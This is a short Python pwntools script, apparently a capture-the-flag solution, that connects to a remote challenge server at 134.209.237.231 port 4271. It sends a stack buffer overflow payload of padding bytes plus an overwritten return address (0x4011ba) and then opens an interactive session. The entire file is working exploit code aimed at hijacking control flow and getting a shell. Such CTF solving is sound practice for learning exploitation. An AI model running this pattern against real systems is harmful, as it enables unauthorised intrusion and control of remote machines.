#!/usr/bin/env python3
from pwn import *

context.log_level='debug'
f=ELF('./chal')
#p=process('./chal')
p=remote('134.209.237.231', 4271)

sz=0x960-0x8e0
payload = b'\x00'*(sz+8)
payload+= p64(0x00000000004011ba) # chain
p.recvline()
p.sendline(payload)

p.interactive()
p.close()
